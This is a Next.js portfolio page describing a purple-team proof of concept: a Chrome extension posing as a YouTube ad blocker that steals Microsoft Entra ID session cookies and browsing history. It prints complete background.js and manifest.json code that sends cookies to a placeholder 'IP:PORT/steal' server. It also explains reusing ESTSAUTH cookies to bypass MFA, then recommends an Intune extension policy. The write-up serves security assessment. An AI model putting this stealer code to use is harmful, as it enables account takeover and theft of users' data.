import { Metadata } from "next";
import Link from "next/link";

export const metadata: Metadata = {
  title: "Chrome Ad Block Extension - Youssef Ennaciri",
  description: "Demonstration of how malicious Chrome extensions can steal Entra ID credentials",
};

export default function ChromeExtensionProject() {
  return (
    <section className="relative">
      <div className="max-w-4xl mx-auto px-4 sm:px-6">
        <div className="pt-32 pb-12 md:pt-40 md:pb-20">
          <Link
            href="/projects"
            className="inline-flex items-center text-indigo-400 hover:text-indigo-300 mb-8"
          >
            <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path>
            </svg>
            Back to Projects
          </Link>

          <article className="max-w-none">
            <h1 className="h1 mb-6 font-nacelle text-gray-200 text-4xl md:text-5xl">Chrome Ad Block Extension</h1>

            <p className="text-lg text-indigo-200/65 mb-4">
              During the purple team exercise, it was identified that the current endpoint policies allow users to install browser extensions without requiring administrative approval. This configuration significantly increases the organization's exposure to risk, as adversaries can leverage malicious extensions to capture credentials, monitor user activity, or exfiltrate sensitive data without triggering immediate security controls.
            </p>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Proof of Concept: "YouTube Ads Blocker" (Malicious Chrome Extension)</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              A PoC extension was developed to demonstrate the risk, performing the following actions:
            </p>

            <ul className="list-disc pl-6 mb-4 space-y-2 text-lg text-indigo-200/65">
              <li><strong>Entra ID Account Theft</strong>
                <ul className="list-circle pl-6 mt-1 space-y-1">
                  <li>Exfiltrates session cookies to a remote server.</li>
                  <li>Harvests browsing history and sends it to an attacker-controlled server.</li>
                </ul>
              </li>
            </ul>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Detection Challenges</h2>
            <ul className="list-disc pl-6 mb-4 space-y-2 text-lg text-indigo-200/65">
              <li><strong>AV/EDR Evasion</strong>
                <ul className="list-circle pl-6 mt-1 space-y-1">
                  <li>Extension files are not flagged as malicious.</li>
                  <li>Executes under a trusted browser process (<code className="bg-gray-800 px-1 rounded">chrome.exe</code>).</li>
                </ul>
              </li>
              <li><strong>Lack of User Warnings</strong>
                <ul className="list-circle pl-6 mt-1 space-y-1">
                  <li>Browsers like Chrome place responsibility on users for extension risks, with no security prompts.</li>
                </ul>
              </li>
            </ul>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Coding the Extension</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              The journey began by identifying that computers allowed the installation and use of
              untrusted Chrome extensions, either from the Chrome Web Store or local files. This
              discovery led to the development of a custom Chrome extension leveraging Chrome's
              documented APIs to interact with the browser.
            </p>

            <h3 className="text-lg font-semibold text-gray-200 mb-4 mt-6">background.js</h3>
            <div className="my-4 p-4 bg-gray-800/50 rounded-lg border border-gray-700">
              <pre className="whitespace-pre-wrap text-sm text-gray-300 overflow-x-auto">
                {`async function sendToken(cookie) {
  let exfilUrl = "http://IP:PORT/steal";

  fetch(exfilUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json", // Ensure JSON format
    },
    body: JSON.stringify({
      domain: cookie.domain,
      name: cookie.name,
      value: cookie.value,
    }),
  })
    .then((response) => response.text())
    .then((text) => console.log('[+] Server Response: ' + text)) // Debug response
    .catch((error) => console.error('[-] Fetch Error: ' + error));
}
async function stealMicrosoftCookies() {
  let domains = [
    ".microsoft.com",
    ".login.microsoftonline.com",
    ".outlook.com",
    "outlook.office.com",
    ".teams.microsoft.com",
  ];

  for (let domain of domains) {
    chrome.cookies.getAll({ domain: domain }, (cookies) => {
      cookies.forEach(sendToken);
    });
  }
}

// Run every 5 seconds
setInterval(stealMicrosoftCookies, 5000);`}
              </pre>
            </div>

            <h3 className="text-lg font-semibold text-gray-200 mb-4 mt-6">manifest.json</h3>
            <div className="my-4 p-4 bg-gray-800/50 rounded-lg border border-gray-700">
              <pre className="whitespace-pre-wrap text-sm text-gray-300 overflow-x-auto">
                {`{
    "manifest_version": 3,
    "name": "Youtube Ad Blocker",
    "version": "1.0",
    "permissions": [
        "cookies",
        "tabs",
        "storage"
    ],
    "host_permissions": [
        "https://*.microsoft.com/*",
        "https://login.microsoftonline.com/*",
        "http://IP:PORT/*"
    ],
    "background": {
        "service_worker": "background.js"
    },
    "icons": {
        "16": "icons48.png",
        "48": "icons48.png",
        "128": "icons144.png"
    }
}`}
              </pre>
            </div>

            <p className="text-lg text-indigo-200/65 mb-4">
              Upon installing the extension in chrome browser. it displays as bellow.
            </p>

            <div className="my-6">
              <img
                src="/images/chrome-extension-screenshot-1.png"
                alt="Chrome extension installation display"
                className="mx-auto rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <p className="text-lg text-indigo-200/65 mb-4">
              At this instance, the extension fetches the session cookies of Microsoft login.microsoft.com and sends them to a remote server as JSON file over HTTPS channel where an adversary reuses them for authentication without requiring for MFA approval.
            </p>

            <div className="my-6">
              <img
                src="/images/chrome-extension-screenshot-2.png"
                alt="Extension fetching session cookies and sending to remote server"
                className="mx-auto rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <p className="text-lg text-indigo-200/65 mb-4">
              The extension is created to be equipped with an additional feather that allows it to exfiltrate the browsing history data to a remote server, this allows an adversary to comprehend the compromised browser and gather more information about the behavior of the target user and environment.
            </p>

            <div className="my-6">
              <img
                src="/images/chrome-extension-screenshot-3.png"
                alt="Extension exfiltrating browsing history data"
                className="mx-auto rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <p className="text-lg text-indigo-200/65 mb-4">
              An attacker in possession of these session cookies could import them into an active browser session and immediately gain access to the associated ITWW accounts. For Entra ID–based accounts, this proof‑of‑concept required importing two specific cookies, ESTSAUTH and ESTSAUTHPERSISTENT, which together re‑establish the authenticated session without requiring user credentials.
            </p>

            <div className="my-6">
              <video
                src="/videos/projects/chrome-extension-video.mp4"
                controls
                className="mx-auto rounded-lg border border-gray-700"
                width={800}
                height={450}
              >
                <source src="/videos/projects/chrome-extension-video.mp4" type="video/mp4" />
                Your browser does not support the video tag.
              </video>
              <p className="text-sm text-gray-400 mt-2 text-center">Demonstration of Chrome extension credential theft</p>
            </div>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Recommendation</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              Intune provides a global extension management policy that can be used to prevent users from installing or running untrusted web browsers. This control helps ensure that only approved and security‑vetted browsers are available within the organization's environment, reducing the risk of unauthorized or unsafe applications being introduced.
            </p>

            <div className="my-6">
              <img
                src="/images/chrome-extension-screenshot-4.png"
                alt="Intune extension management policy"
                className="mx-auto rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>
          </article>
        </div>
      </div>
    </section>
  );
}